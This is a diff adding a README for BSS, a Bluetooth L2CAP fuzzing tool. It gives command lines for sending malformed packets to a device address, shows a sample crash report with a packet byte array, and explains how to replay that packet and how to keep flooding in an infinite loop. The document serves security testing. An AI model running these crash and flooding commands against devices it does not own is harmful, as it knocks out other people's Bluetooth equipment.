@@ -1,0 +1,51 @@
+BSS - Bluetooth Stash Smasher
+-----------------------------
+Pierre BETOUIN <pierre.betouin@security-labs.org>
+http://securitech.homeunix.org/blue/
+
+Performs several L2CAP checks sending malicious packets (L2CAP)
+Initial source code analysis from tanya tool (tbear)
+
+Example of use (short random L2CAP packets):
+----------------
+./bss -s 50 -m 12 00:12:EE:XX:XX:XX 
+.......
+00:12:EE:XX:XX:XX BT stack may have crashed. This device seems 
+to be vulnerable to buggy packets. Please, ensure that the device 
+has really crashed doing a bt scan for instance.
+----------------------------------------------------
+Host           00:12:EE:XX:XX:XX
+Packet size    11
+----------------------------------------------------
+Packet dump
+               0x75 0x3F 0x1E 0x3B 0x0B 0xBD 0xC4 0x98 0xBB 0x72 0xD0 
+----------------------------------------------------
+char replay_buggy_packet[]="\x75\x3F\x1E\x3B\x0B\xBD\xC4\x98\xBB\x72\xD0";
+
+Then, try to ensure that this packet is responsible (and only this one : 
+sometimes, cellphones crash because of multiple packets, or flooding effects) :
+
+cd replay_packet
+[ EDIT replay_l2cap_packet.c]
+
+And modify SIZE and replay_buggy_packet :
+-------------------------------------------------------------
+	#define SIZE 11
+	char replay_buggy_packet[]="\x75\x3F\x1E\x3B\x0B\xBD\xC4\x98\xBB\x72\xD0";
+-------------------------------------------------------------
+
+Then, type make :
+	make
+
+and try this packet against your equipment :
+	./replay_l2cap_packet 00:12:EE:XX:XX:XX
+
+
+TIPS
+----
+* In order to benchmark BT implementation, you may want to use time command :
+time ./bss -m 12 <BT_ADDR>
+
+* You may increase -M value, which allows you to go on fuzzing even if
+some packets have not been sent to the equipment : some devices may
+crash because of flooding for instance. 0 means an infinite loop.
